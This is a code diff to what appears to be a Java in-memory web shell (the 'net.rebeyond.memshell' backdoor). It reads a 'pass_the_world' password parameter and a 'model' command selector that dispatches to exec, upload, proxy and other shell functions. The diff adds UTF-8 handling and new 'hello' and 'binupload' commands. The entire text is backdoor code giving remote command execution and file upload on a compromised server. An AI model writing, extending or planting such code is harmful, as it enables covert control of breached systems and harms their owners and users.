@@ -1,5 +1,6 @@
 	javax.servlet.http.HttpServletRequest request=$1;
 	javax.servlet.http.HttpServletResponse response = $2;
+	request.setCharacterEncoding("UTF-8");
 	String pass_the_world=request.getParameter("pass_the_world");
 	String model=request.getParameter("model");
 	String result="";
@@ -10,6 +11,10 @@ try {
 				if (model==null||model.equals(""))
 				{
 					result=net.rebeyond.memshell.Shell.help();
+				}
+				else if (model==null||model.equals("hello"))
+				{
+					result=net.rebeyond.memshell.Shell.hello();
 				}
 				else if (model.equalsIgnoreCase("exec"))
 				{
@@ -70,6 +75,10 @@ try {
 					if (type==null||!type.equalsIgnoreCase("b"))
 						type="a";
 					result=net.rebeyond.memshell.Shell.upload(path, fileContent,type);
+				}
+				else if (model.equalsIgnoreCase("binupload"))
+				{
+					result = net.rebeyond.memshell.Shell.binupload();
 				}
 				else if (model.equalsIgnoreCase("proxy"))
 				{
